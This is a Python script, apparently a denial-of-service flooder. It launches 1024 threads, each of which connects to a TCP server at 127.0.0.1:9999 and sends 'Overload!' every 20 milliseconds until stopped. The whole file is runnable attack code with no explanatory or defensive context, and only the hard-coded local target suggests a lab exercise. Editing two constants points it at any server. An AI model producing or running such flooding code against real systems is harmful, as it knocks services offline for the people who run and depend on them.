import socket
import threading
import time

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9999

def attack():
    """Simulate a single attacking client."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((TARGET_HOST, TARGET_PORT))  
        while True:
            message = "Overload!" 
            client.sendall(message.encode('utf-8'))
            print(f"[SENT] {message}")
            time.sleep(0.02)
    except Exception as e:
        print(f"[ERROR] {e}")
    finally:
        client.close()

def start_attack(threads_count):
    """Start multiple threads to flood the server."""
    print(f"Starting attack with {threads_count} threads...")
    threads = []

    for _ in range(threads_count):
        thread = threading.Thread(target=attack)
        thread.daemon = True  
        thread.start()
        threads.append(thread)

    try:
    # Main thread sleeps to make room for other threads
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

if __name__ == "__main__":
    start_attack(threads_count=1024)
